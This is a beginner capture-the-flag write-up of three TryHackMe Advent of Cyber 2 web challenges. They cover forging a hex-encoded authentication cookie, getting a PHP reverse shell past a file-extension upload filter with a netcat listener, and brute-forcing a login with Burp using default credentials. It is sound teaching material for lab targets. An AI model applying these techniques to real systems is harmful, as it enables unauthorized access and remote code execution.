# Advent of Cyber 2
#### Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.
#### [Room Link](1)

## Tasks
<details>
<summary>1. [Day 1] Web Exploitation - A Christmas Crisis</summary>

Welcomeeeee back to the Advent of Cyber! Since the last year hopefully Santa's elfs are better at securing the network!

First off, we see there is information about DNS, HTTP, and cookies making you think that this will likely focus on basics and work up through the days as we perform more challenges and get better with our skills. After deploying the target machine and open up the IP in the web browser we see this screen asking us to register.

 ![Day1Webpage](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day1_webpage.png)

We go ahead and register with some credentials and are greeted with this page:

  ![Day1Console](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day1_console.png)

Moving into the questions we first have `What is the name of the cookie used for authentication?`.
Seems pretty simple so far! We can find out what cookies were set in Firefox by pressing F12 then selecting the "Storage" tab.
Looking at "Cookies" set for the site we see the cookie is this(you can also view this by using a 3rd party browser extension "Cookie Manger"):

`{
 "cookieManagerVersion": "1.6",
 "userAgent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0",
 "cookies": [
 {
  "name": "auth",
  "value": "7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a226e617068616c227d",
  "domain": "10.10.121.234",
  "hostOnly": true,
  "path": "/",
  "secure": false,
  "httpOnly": false,
  "session": true,
  "storeId": "firefox-default",
  "sameSite": "no_restriction",
  "firstPartyDomain": ""
 }
]
}`  
So we can get our first answer pretty quickly: `auth`.

Looking at the second question: `In what format is the value of this cookie encoded?`
We can see the value is the string `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a226e617068616c227d` which appears to be encoded. Having previous experience and knowing this is a beginners CTF we can guess that this is a simple encoding algorithm such as Base64, ROT13, or Hex. Throwing the string into [CyberChef](https://gchq.github.io/CyberChef/) we can try the basic encoding which in this case appears to be hex! Looking back at the string we can verify this by seeing that all the characters are within the [a-f] & [1-9] range which are the characters that represent hex values! Therefore we have our second answer `hexadecimal`!

With our newly decoded string:
`{"company":"The Best Festival Company", "username":"naphal"}`

We see the next question asks us this: `Having decoded the cookie, what format is the data stored in?`.

Having previous experience definitely helps again here as I know this is a `JSON` format however some quick  google searches on web data formats (specifically Javascript, one of the main web programming languages ) should point you in the right direction.

  After entering out answer `JSON`, we see the prompt `Figure out how to bypass the authentication.` which means lets get hacking!

  We are given the question `What is the value of Santa's cookie?` which makes us look back at the cookies to see what we can do with it. Up in the section explaining Cookies, it starts with the sentence "HTTP is an inherently stateless protocol." which is a clue about what we have to do.

  Given that HTTP is a stateless protocol, cookies are used throughout the web to save state about what you are doing, if you are logged in an and who you are logged in as. To increase security, even if you have a cookie the webserver will save several things to verify the cookie is the same as the one issued and that you arent changing to values to access things you shouldnt. However, if the web server DOESNT verify that information we might be able to get access to other user's state by changing the cookie values.

  Knowing this is in JSON format and encoded within hexadecimal, all we have to do is change the value in the original cookie to "Santa" then hex encoded it. After getting that new value, we can hope back over to our original cookie and replace the `value` field with our new encoded string.

  `{"company":"The Best Festival Company", "username":"santa"}`
  hex encode to (if you have spaces in CyberChef set the delimiter option to "None"):
  `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`

After putting value into the correct field in our original cookie, we can refresh the page and see it looks a bit different!

 ![SantaConsole](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day_santaconsole.png)

 After firing up all the controls we get our flag!

 This was a good intro and hopefully you learned a few things or brushed up on your skills for the upcoming days!

 See yall on Day 2!
</details>
<details>
<summary>2. [Day 2] Web Exploitation - The Elf Strikes Back!</summary>

Gooooooddd morninngggg TryHackmeeee! Time for Day 2 of the Advent of Cyber 2!

Taking a look at the "dossier" prepared for us we see that GET Parameters, File Uploads, and Reverse Shells are mentioned indicating that we will most likely be focusing on a [File Upload vulnerability](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)!

After launching our machine and opening our THM AttackBox see this blurb:
`For Elf McEager:
You have been assigned an ID number for your audit of the system: [REDACTED] . Use this to gain access to the upload section of the site.Good luck!`


Hmmm, so we will keep that in mind but lets first go to the webpage mentioned for the first question: `What string of text needs adding to the URL to get access to the upload page?`

Well browsing to the webpage we are greeted with this page

![NotSignedIn](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day2_notsignedin.png)

Well it does give us the hint `Please enter your ID as a GET parameter (?id=YOUR_ID_HERE)` which calls back the dossier note:

 `We then have the resource that we're selecting -- in this case that is the homepage of the website: index.php. As a side note, all homepages must be called "index" in order to be correctly served by the web server without having to be specified fully. This is how you can go to https://tryhackme.com without having to specify that you want to receive the home page -- the index page is served automatically because you didn't specify!
The final two aspects of the URL are the most important for our current topic: they both relate to GET parameters. First up we have ?snack=. Here ? is used to specify that a GET parameter is forthcoming. We then have the parameter name: snack. This is used to identify the parameter to the server. We then have an equals sign (=), indicating that the value will come next.`

Well first knowing that `index.php` should serve us the same page, we browse to `http://[machineIP]]/index.php` to verify this! We do see the same page! Now that we know we are using `index.php` we should be able to add in our GET parameter which combine our given ID and the string they have on the webpage!

Entering the correct URL we get to this new page!

![protectthefactory](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day2_protectthefactory.png)

Now that we have a upload page lets take a look at the source code to get some clues on what we can do! BY entering `viewsource:` before a URL in FireFox lets you easily see the sourcecode of a website OR you can do the same by right-clicking and clicking `View Source`.

Looking at the source code we see this piece of HTML `<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">` which indicates this upload form is looking for file that match the extensions `.jpeg,.jpg,.png` which are image file extensions. However it seems to be looking for only the file extensions and not checking to see if those files are ACUTAL image files.

If that is the case then we may be able to upload that reverse shell that was mentioned in the dossier!

Since we know this is a `index.php` page lets try a common php reverse shell available from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)!

So after downloading our script we need to edit the options:
`$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS`

to the IP of our host machine and the port our shell listener will be at! After that we can go ahead and make a new copy with our "png" ending with the command `cp php-reverse-shell.php shell.png`

After changing our IPs and file extension, lets go ahead and open up a new terminal and run the command `nc -nvlp 4545` to listen on port 4545 for our reverse shell!

Back on our webpage we go and select our new `shell.jpg` and click the upload button. We get the message `File received successfully!` but nothing seems to happen. Well knowing that this is the upload page we might have to browse to another URL on the host to see the file we uploaded!

Trying first `[machineIP]/images/` but that gives us the same "Enter ID" page. Lets try the URL `machineIP/uploads/` which give us this page with our uploaded `shell.png`!

![uploadsdir](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day2_uploadsdir.png)

Let go ahead and click on our "image" file and check the `nc` session! However there doesn't seem to be a session :/ Hmmmm, we seem to get the error `The image [URL] cannot be displayed because it contains errors.` Well it seems that the server may attempt to execute the file so lets change our extension up some more to see if we cant get our php shell to run.

Looking back at the dossier we see this tidbit of info:
    `File Extension Filtering: As the name suggests extension filtering checks the file extension of uploaded files. This is often done by specifying a list of allowed extensions, then checking the uploaded file against the list. If the extension is not in the allowlist, the upload is rejected.
    So, what's the bypass? Well, the answer is that it depends entirely on how the filter is implemented. Many extension filters split a filename at the dot (.) and check what comes after it against the list. This makes it very easy to bypass by uploading a double-barrelled extension (e.g. .jpg.php). The filter splits at the dot(s), then checks what it thinks is the extension against the list. If jpg is an allowed extension then the upload will succeed and our malicious PHP script will be uploaded to the server.`

Well that explains exactly what is going on! Always read the entire folks or end up like me!

Switching up to our new file extension of the same script with the command `cp php-reverse-shell.php shell.jpg.php`, we then upload the new file and execute it with from the `/uploads/` directory!

Looking back at our `nc` we see that we have a shell!

To answer the final question we use the command `cat /var/www/flag.txt` to read out the flag.

Key Takeaways!:
ALWAYS READ THE DOSSIER -  The dossier is helping us out so make sure to read it fully to understand what is going on in the problem!
KISS (Keep it simple stupid)! - Try the basic stuff before thinking advanced! This is a learning CTF!
</details>
<details>
 <summary>3. [Day 3] Web Exploitation - Christmas Chaos</summary>

So from previous days we know that the dossier that is given will lead us on the challenge! In this dossier it explains what default credentials are and how to use BurpSuite to bruteforce a login page.

We go ahead and open up our webpage.

 ![SleighTracker](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day3_sleightrackerlogin.png)

Looking at the question `Use BurpSuite to brute force the login form.  Use the following lists for the default credentials:

Username 	Password
root 	root
admin 	password
user 	12345`

Hmmm, so pretty straightforward. It seems like today is focusing on learning Burp a bit better because it could be used heavily in the days to come!

So looking at the dossier, I see that it has the exact instructions for how to perform this dictionary attack. If you think you need a bit more help with Burp to learn it I recommend running through [BurpSuite Room](https://tryhackme.com/room/rpburpsuite) on TryHackMe to get a bit more practice in!

Once performing the brute force we see this page, which scrolling down a bit gives us our flag!

![santamap](https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/AdventOfCyber2/resources/day3_santamap.png)

Seeing as this mainly focused on the basics on BurpSuite, we should expect to use it a bit more going forward!

See yall on Day 3!

</details>
4. Day 4 Coming!
5. Day 5 Coming!

## Review

For links:
[1]: https://tryhackme.com/room/adventofcyber2
[2]:
[3]:
[4]:
[5]:
